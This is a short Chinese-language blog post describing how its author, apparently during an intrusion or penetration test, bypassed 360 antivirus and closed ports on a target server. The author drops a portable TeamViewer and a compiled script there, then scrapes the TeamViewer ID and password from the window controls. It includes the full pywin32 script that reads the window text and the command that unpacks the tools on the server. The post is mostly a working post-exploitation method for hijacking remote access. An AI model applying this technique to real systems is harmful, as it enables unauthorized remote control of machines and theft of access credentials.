---
title: 通过Teamviewer突破目标系统防御
date: 2019-07-21 11:51:24
description: 极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。


---

在一次测试中，我发现目标服务器挂着360tray、360bdoctor以及360EntClient等众多查杀软件，导致我的rat十分不稳定，且目标关闭了445、3389等端口，以及安装KB2871997补丁,使我十分懊恼。

![img](https://www.yunzhijia.com/microblog/filesvr/5d34186190144e185987e409)

后来借鉴了前辈的teamview思路，成功突破难题

通过运行teamview ,使用win32api查找句柄的方式获取窗口对话框的文本Edit 获取对应的ID、密码，为了很好兼容所有版本,我直接遍历所有控件的内容。

![img](https://www.yunzhijia.com/microblog/filesvr/5d341948a372597c751e557b)

使用pywin32查找对应的句柄:

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import win32gui as gui
import win32con,win32gui

def findwindow(pHandle):
    handle=None
    while handle!=0:
        handle=gui.FindWindowEx(pHandle,handle,None,None)        
        if handle!=0:
            findwindow(handle)
            buffer = '0' * 17
            len = win32gui.SendMessage(handle, win32con.WM_GETTEXTLENGTH) + 1
            win32gui.SendMessage(handle, win32con.WM_GETTEXT, len, buffer)
            print buffer[:len]
findwindow(gui.FindWindow(None,'TeamViewer'))
```

将Teamview 单文件，以及编译后的脚本压缩丢入服务器中并使用命令行进行解压:

```
start winrar x team.zip F:\
```

![img](https://www.yunzhijia.com/microblog/filesvr/5d34189ca372597c751e54a4)

最终效果，成功获取到对方teamview ID 登录密码。

![img](https://www.yunzhijia.com/microblog/filesvr/5d34188328011f3c534e0511)

实现起来非常简单，就是对win32api比较生疏，给自己挖了点坑-.-